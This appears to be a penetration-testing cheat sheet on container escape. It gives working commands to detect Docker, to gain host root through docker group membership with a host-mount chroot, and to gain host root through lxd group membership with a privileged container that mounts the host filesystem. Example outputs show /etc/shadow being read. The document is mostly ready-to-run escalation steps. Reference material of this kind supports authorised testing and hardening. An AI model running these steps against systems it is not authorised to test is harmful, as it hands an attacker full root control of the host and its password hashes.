# DOCKER / LXD / CONTAINER ESCAPE

### Check if in docker

Are you in a container? — Different escape techniques

```bash
cat /.dockerenv
cat /proc/1/cgroup | grep docker
```

<details>
<summary>Example Output</summary>

```
ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 (FILE EXISTS = inside Docker)

cat /proc/1/cgroup
12:blkio:/docker/abc123...
(Confirmed: running inside Docker container)
```
</details>

---

### Docker group

Mount host filesystem — Instant root on host

```bash
id | grep docker
docker images
docker run -v /:/mnt --rm -it <image> chroot /mnt bash
```

<details>
<summary>Example Output</summary>

```
id
uid=1000(john) gid=1000(john) groups=999(docker)

docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# whoami
root
# cat /etc/shadow
root:$6$abc...
(Full root on host via docker)
```
</details>

---

### LXD group

Mount host filesystem via LXD — Full root access to host

```bash
id | grep lxd
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
```

<details>
<summary>Example Output</summary>

```
id: groups=110(lxd)

lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
# cat /mnt/root/etc/shadow
(Full host filesystem access)
```
</details>

---
